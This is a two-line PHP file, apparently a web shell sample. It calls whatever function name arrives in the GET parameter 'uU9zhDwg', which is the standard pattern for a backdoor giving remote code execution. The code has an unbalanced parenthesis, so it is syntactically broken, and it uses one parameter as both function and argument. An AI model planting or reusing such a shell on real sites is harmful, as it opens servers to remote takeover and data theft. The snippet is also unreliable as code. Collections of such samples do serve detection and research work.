<?php
$_GET['uU9zhDwg'](($_GET['uU9zhDwg']);
?>
